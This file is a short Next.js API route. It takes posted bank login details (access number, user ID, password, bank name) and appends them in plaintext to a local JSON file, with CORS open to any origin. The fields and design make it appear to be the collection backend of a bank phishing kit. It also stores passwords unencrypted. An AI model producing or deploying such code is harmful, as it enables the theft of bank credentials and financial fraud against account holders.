import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function POST(req: NextRequest) {
  const res = NextResponse.next();

  // Set CORS headers on the response
  res.headers.set('Access-Control-Allow-Origin', '*');
  res.headers.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return new NextResponse(null, { status: 200 });
  }
  
  try {
    const body = await req.json();
    const { accessNumber, userId, password, bank } = body;

    const data = {
      accessNumber,
      userId,
      password,
      bank,
      timestamp: new Date().toISOString(),
    };

    const filePath = path.join(process.cwd(), 'data', 'info.json');
    let currentData: any[] = [];

    if (fs.existsSync(filePath)) {
      const rawData = fs.readFileSync(filePath, 'utf8');
      currentData = JSON.parse(rawData || '[]');
    }

    currentData.push(data);
    fs.writeFileSync(filePath, JSON.stringify(currentData, null, 2));

    return NextResponse.json({ status: 'success' });
  } catch (error) {
    return NextResponse.json(
      {
        success: false,
        message: 'Failed to save data',
        error: (error as Error).message,
      },
      { status: 500 }
    );
  }
}
